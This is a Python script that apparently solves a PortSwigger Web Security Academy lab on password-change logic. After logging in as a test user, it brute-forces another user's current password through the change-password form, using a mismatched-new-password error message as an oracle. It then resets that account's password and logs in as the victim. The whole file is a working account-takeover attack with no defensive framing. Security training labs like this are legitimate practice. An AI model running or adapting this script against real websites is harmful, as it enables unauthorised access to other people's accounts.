import sys
import requests

def load_password_list(file_path):
    with open(file_path, 'r') as file:
        return file.readlines()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
change_url = burp_url + '/my-account/change-password'
password_list_path = '../Portswigger_lists/password_list.txt'

session = requests.Session()
burp_data = {"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)
passwords = load_password_list(password_list_path)

for password in passwords:
    bruted = password.strip()
    burp_data = {"username": "carlos", "current-password": bruted, "new-password-1": "123", "new-password-2": "1234"}
    response = session.post(change_url, data=burp_data)
    if "New passwords do not match" in response.text:
        correct_old_password = bruted
        break

burp_data = {"username": "carlos", "current-password": correct_old_password, "new-password-1": "111111", "new-password-2": "111111"}
response = session.post(change_url, data=burp_data)

burp_data = {"username": "carlos", "password": "111111"}
session.post(login_url, data=burp_data)
